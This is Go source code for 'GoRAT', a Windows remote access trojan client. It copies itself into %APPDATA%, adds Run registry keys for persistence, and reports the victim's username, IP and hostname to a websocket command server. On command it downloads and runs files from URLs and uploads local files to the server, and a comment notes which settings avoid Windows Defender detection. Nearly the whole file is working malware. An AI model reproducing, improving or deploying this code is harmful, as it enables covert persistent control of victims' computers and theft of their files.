package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	externalip "github.com/glendc/go-external-ip"
	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows/registry"
)

func checkPermissions() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func addRegKey(regLocation registry.Key, regPath string, key string, value string) bool {
	k, err := registry.OpenKey(regLocation, regPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
		return false
	}
	if err := k.SetStringValue(key, value); err != nil {
		log.Fatal(err)
		return false
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
		return true
	}
	return true
}

// Make application persistent using registry keys
func persistency(elevation bool) bool {
	// Create a copy of the application on %appdata% so we can easily access GoRAT's executable on the registry

	// Get application path
	goApp, err := os.Executable()
	if err != nil {
		panic(err)
	}

	// Open source file (this application)
	src, err := os.Open(goApp)
	if err != nil {
		log.Fatal(err)
		return false
	}
	defer src.Close()

	// Create or refer to the file
	fileToDestination := os.Getenv("APPDATA") + "\\gorat.exe" // Useful variable for later

	dest, err := os.Create(fileToDestination)
	if err != nil {
		log.Fatal(err)
		return false
	}
	defer dest.Close()

	// Actual copy
	_, err = io.Copy(dest, src)
	if err != nil {
		log.Fatal(err)
		return false
	}

	// Check if application has administrator permissions
	if checkPermissions() && elevation {
		// Main key
		adminLevelKey1st := "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
		addRegKey(registry.LOCAL_MACHINE, adminLevelKey1st, "GoRAT", fileToDestination)

		// Fallback key
		adminLevelKey2nd := "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
		addRegKey(registry.CURRENT_USER, adminLevelKey2nd, "GoRAT", fileToDestination)
	}
	userLevelKey := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	addRegKey(registry.CURRENT_USER, userLevelKey, "GoRAT", fileToDestination)
	return true
}

func DownloadFile(url string, filepath string) error {
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}
	return nil
}

func main() {
	var GoRAT map[string]string
	GoRAT = make(map[string]string)
	// Declare GoRAT project vars
	GoRAT["version"] = "1.1.0"
	GoRAT["wsURI"] = "example.com:9898"

	/*
		If the following variable is set to true, it will most likely flag on every anti-virus
		/!\ Tested with Windows Defender
		false: no flags
		true: Behavior:Win32/Persistence.MI!ml (Severe)
	*/
	var shouldUseAdminKeys bool = false
	persistency(shouldUseAdminKeys)

	// Get actual username
	name, err := os.UserHomeDir()
	if err != nil {
		name = ".\\.\\None"
	}

	// Get external IP
	splitN := strings.Split(name, "\\")
	username := splitN[2]
	consensus := externalip.DefaultConsensus(nil, nil)
	ip, err := consensus.ExternalIP()

	// Get Machine name (not user)
	machinename, err := os.Hostname()

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	u := url.URL{Scheme: "ws", Host: GoRAT["wsURI"], Path: "/"}
	log.Printf("connecting to %s", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			_, messageb, err := c.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				return
			}
			log.Printf("MESSAGE: %s", messageb)

			message := fmt.Sprintf("%s", messageb)
			/*

				RFS: Download-Open File from internet

			*/
			if strings.Contains(message, "NodeServer::Message[<&>]RFS::") && (strings.Contains(message, "DOFile") || strings.Contains(message, "DFile")) && (strings.Contains(message, "ip:"+string(ip)) || strings.Contains(message, "ip:all")) {
				uri, fn := "", ""
				if !strings.Contains(message, "uri:") {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]No URI (uri:) set[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
				} else {
					uri = strings.Split(strings.Split(message, "uri:")[1], "[<&>]")[0]
				}
				if !strings.Contains(message, "fn:") {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]No filename (fn:) set[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
				} else {
					fn = "GORAT.EXECUTABLE.TEMP." + strings.Split(strings.Split(message, "fn:")[1], "[<&>]")[0]
				}

				if uri == "" || fn == "" {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]No URI (uri:) and/or filename (fn:) set[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
					return
				}
				err := DownloadFile(uri, os.Getenv("APPDATA")+"\\"+fn)
				if err != nil {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]Error downloading file[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
				}
				if strings.Contains(message, "DOFile") {
					exec.Command(os.Getenv("APPDATA") + "\\" + fn)
				}
			}

			/*

				RFS: Open File

			*/
			if strings.Contains(message, "NodeServer::Message[<&>]RFS::OFile") && (strings.Contains(message, "ip:"+string(ip)) || strings.Contains(message, "ip:all")) {
				fn := ""
				if !strings.Contains(message, "fn:") {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("No filename (fn:) set[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
				} else {
					fn = strings.Split(strings.Split(message, "fn:")[1], "[<&>]")[0]
				}
				if fn == "" {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]Filename (fn:) is null[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
					return
				}
				exec.Command(os.Getenv("APPDATA") + "\\" + fn)
			}
			/*

				RFS: Upload File (to server)

			*/
			if strings.Contains(message, "NodeServer::Message[<&>]RFS::UFile") && (strings.Contains(message, "ip:"+string(ip)) || strings.Contains(message, "ip:all")) {
				path := ""
				if !strings.Contains(message, "path:") {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]No file path (path:) set[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
				} else {
					path = strings.Split(strings.Split(message, "path:")[1], "[<&>]")[0]
				}
				if path == "" {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]File path (path:) is null[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
					return
				}
				data := make([]byte, 50000)
				fdata, err := os.Open(path)
				if err != nil {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]%s[<&>]%q[<&>]%s (%s)", err, ip, machinename, username)))
				}
				actualData, err := fdata.Read(data)
				if err != nil {
					c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]%s[<&>]%q[<&>]%s (%s)", err, ip, machinename, username)))
				}
				splntemp := strings.Split(path, "\\")
				c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::UFile[<&>]%s:%s[<&>]%q[<&>]%s (%s)[<&>]GORAT::NO_PRINT", splntemp[len(splntemp)-1], base64.StdEncoding.EncodeToString(data[:actualData]), ip, machinename, username)))
			}
			/*

				RFS: Ping server

			*/
			if strings.Contains(message, "NodeServer::Message[<&>]RFS::Ping") && (strings.Contains(message, "ip:"+string(ip)) || strings.Contains(message, "ip:all")) {
				c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Message[<&>]HelloPing[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
			}
		}
	}()

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case _ = <-ticker.C:
			err := c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::Keep-Alive[<&>]%q[<&>]%s (%s)[<&>]GORAT::NO_PRINT", ip, machinename, username)))
			if err != nil {
				log.Println("write:", err)
				return
			}
		case <-interrupt:
			// Cleanly close the connection by sending a close message and then
			// waiting (with timeout) for the server to close the connection.
			err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			log.Println("interrupt")
			c.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Client::NewDisconnection[<&>]%q[<&>]%s (%s)", ip, machinename, username)))
			if err != nil {
				log.Println("write close:", err)
				return
			}
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
